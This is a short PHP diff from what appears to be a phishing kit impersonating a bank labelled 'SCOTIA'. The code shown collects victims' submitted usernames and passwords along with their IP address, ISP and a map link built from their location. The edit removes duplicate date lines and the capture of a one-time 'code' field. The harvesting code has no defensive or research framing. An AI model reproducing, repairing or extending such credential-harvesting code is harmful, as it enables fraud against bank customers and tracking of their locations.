@@ -45,9 +45,6 @@ if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
-$full_date = date("h:i:s|M/d/Y");
-$time = date("h:i:s");
-$date = date("M/d/Y");
 
 function get_client_ip()
 {
@@ -183,11 +180,9 @@ if ($success==false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "SCOTIA";
-
     $url        = "https://SCOTIA.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
 	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
